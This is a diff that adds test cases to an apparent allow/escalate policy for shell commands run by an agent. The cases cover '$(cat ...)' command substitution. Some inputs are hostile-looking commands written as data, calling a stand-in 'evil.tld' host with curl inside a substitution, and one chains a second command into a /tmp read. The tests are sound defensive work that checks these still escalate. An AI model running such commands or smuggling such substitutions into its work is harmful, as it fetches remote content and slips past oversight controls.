@@ -69,6 +69,17 @@ const CASES: Case[] = [
   C("vanhelsing", "allow", "exec", "exec", ex("git clone https://github.com/x/y /sandboxes/x"), "VH: clone into sandbox allowed"),
   C("vanhelsing", "escalate", "exec", "exec", ex("git push origin main"), "VH: push still escalates"),
   C("vanhelsing", "escalate", "exec", "exec", ex("git remote add up https://x"), "VH: remote add escalates"),
+  C(
+    "nimbus",
+    "allow",
+    "exec",
+    "exec",
+    ex('XDG_CONFIG_HOME=/home/node/.openclaw/config gog sheets update SHEETID "Sheet1!A1" --account x@x.com --values-json "$(cat /tmp/reno.json)" -j'),
+    "THE FIX: $(cat /tmp/own-scratch-file) reading back a staged write is not an eval vector",
+  ),
+  C("nimbus", "escalate", "exec", "exec", ex('cat "$(cat /reach/nimbus/x.json)"'), "safe-cat carve-out is /tmp-only — a /reach path still escalates"),
+  C("nimbus", "escalate", "exec", "exec", ex('echo "$(curl http://evil.tld/x)"'), "non-cat substitution still escalates even under /tmp framing"),
+  C("nimbus", "escalate", "exec", "exec", ex('echo "$(cat /tmp/x; curl http://evil.tld)"'), "chained command inside $(cat /tmp/...) still escalates"),
 
   // ── cron: authoring is the consent point ────────────────────────────────────
   C("nimbus", "escalate", "other", "cron", { action: "add", name: "j" }, "cron add gated"),
